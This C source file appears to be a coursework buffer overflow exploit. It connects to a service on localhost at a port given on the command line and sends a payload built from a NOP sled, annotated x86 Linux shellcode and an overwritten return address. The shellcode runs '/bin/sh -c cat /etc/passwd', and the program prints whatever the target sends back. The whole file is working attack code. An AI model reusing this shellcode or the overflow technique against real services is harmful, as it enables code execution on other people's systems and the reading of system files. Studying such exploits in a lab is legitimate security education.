#include <sys/types.h>
#include <sys/socket.h>
#include <stdio.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <stdlib.h>
#include <ctype.h>
#include <netdb.h>

char inbuff[1024];

void DoAttack(int PortNo);
void Attack(FILE *outfile);

int main(int argc, char * argv[]){

    char * studStr, *portStr;
    int studLen, portLen;
    int studNo, portNo;
    int i;

    if (argc != 2){
        fprintf(stderr, "usage %s portno\n", argv[0]);
        exit(1);
    }

    portStr = argv[1];
    if ((portLen = strlen(portStr)) < 1){
        fprintf(stderr, "%s: port number must be 1 or more digits\n", argv[0]);
        exit(1);
    }
    for (i = 0; i < portLen; i++){
        if(!isdigit(portStr[i])){
            fprintf(stderr, "%s: port number must be all digits\n", argv[0]);
            exit(1);
        }
    }
    portNo = atoi(portStr);

    fprintf(stderr, "Port Number  %d\n", portNo);

    DoAttack(portNo);

    exit(0);
}

void  DoAttack(int portNo) {
    int server_sockfd;
    int serverlen;

    struct sockaddr_in server_address;

    FILE * outf;
    FILE * inf;
    struct hostent *h;


    server_sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if((h=gethostbyname("localhost"))==NULL){
        fprintf(stderr,"Host Name Error...");
        exit(1);
    }

    server_address.sin_family = AF_INET;
    memcpy((char *) &server_address.sin_addr.s_addr, h->h_addr_list[0], h->h_length);
    /* server_address.sin_addr.s_addr = htonl(INADDR_ANY); */
    server_address.sin_port = htons(portNo);

    if(connect(server_sockfd,(struct sockaddr*)&server_address,sizeof(struct sockaddr))==-1){
        fprintf(stderr,"Connection out...");
        exit(1);
    }

    outf = fdopen(server_sockfd, "w");

    // add log message here
    Attack(outf);

    inf = fdopen(server_sockfd, "r");
    if (inf == NULL){
        fprintf(stderr,"could not open socket for read");
        exit(1);
    }
    do {
        inbuff[0] = '\0';
        fgets(inbuff,1024,inf);
        if (inbuff[0]){
            fputs(inbuff,stdout);
        }
    } while (!feof(inf));
    fclose(outf);
    fclose(inf);
    return;
}

char compromise[130] = {
    
    //24 0x90
    0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,
    0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,
    0x90,0x90,0x90,0x90,
    
    0x90,	//nop
    0x90,	//nop
    0xEB,	//start: jmp short codeEnd
    0x29,	
    0x5E,	//start2: pop esi
    0x31,	//xor eax, eax
    0xC0,
    0x88,	//mov [byte esi+flagStr-exeStr-2],al
    0x46,
    0x07,
    0x88,	//mov [byte esi+cmdStr-exeStr-1],al
    0x46,
    0x0B,
    0x88,	//mov [byte esi+arrayAddr-exeStr-1],al
    0x46,
    0x20,
    0x89,	//mov [byte esi+arrayAddr-exeStr+12],eax
    0x46,
    0x2D,
    0x89,	//mov [byte esi+arrayAddr-exeStr],esi
    0x76,
    0x21,
    0x8D,	//lea edi,[byte esi+flagStr-exeStr]
    0x7E,
    0x09,
    0x89,	//mov [byte esi+arrayAddr-exeStr+4],edi
    0x7E,
    0x25,
    0x8D,	//lea edi,[byte esi+cmdStr-exeStr]
    0x7E,
    0x0C,
    0x89,	//mov [byte esi+arrayAddr-exeStr+8],edi
    0x7E,
    0x29,
    0xB0,	//mov al,0x0b
    0x0B,
    0x89,	//mov ebx,esi
    0xF3,
    0x8D,	//lea ecx,[byte esi+arrayAddr-exeStr]
    0x4E,
    0x21,
    0x31,	//xor edx, edx
    0xD2,
    0xCD,	//int 0x80
    0x80,
    0xE8,	//codeEnd:   call start2
    0xD2,
    0xFF,
    0xFF,
    0xFF,	
    0x2F,	//exeStr:    db "/bin/shXy"
    0x62,
    0x69,
    0x6E,
    0x2F,
    0x73,
    0x68,
    0x58,
    0x79,
    0x2D,	//flagStr:   db "-cX"
    0x63,
    0x58,
    0x63,	//cmdStr:    db "cat /etc/passwd;exitX"
    0x61,
    0x74,
    0x20,
    0x2F,
    0x65,
    0x74,
    0x63,
    0x2F,		
    0x70,
    0x61,
    0x73,
    0x73,
    0x77,
    0x64,
    0x3B,
    0x65,
    0x78,
    0x69,
    0x74,
    0x58,
    0xFF,	//arrayAddr: dd 0xffffffff ; arg[0]
    0xFF,
    0xFF,
    0xFF,
    0xFF,	//dd 0xffffffff ; arg[1]
    0xFF,
    0xFF,
    0xFF,
    0xFF,	//dd 0xffffffff ; arg[2]
    0xFF,
    0xFF,
    0xFF,
    0xFF,	//dd 0xffffffff ; arg[3]
    0xFF,
    0xFF,
    0xFF,
    0x61,	//newAddr:   dd newAddr-start


    0x88,   //return address
    0xF7,
    0xFF,
    0xBF,
    
    0x0d,   //new line
    0x00    //null character
    
};

void Attack(FILE *outfile){
    fprintf(outfile,compromise);
    fflush(outfile);
}
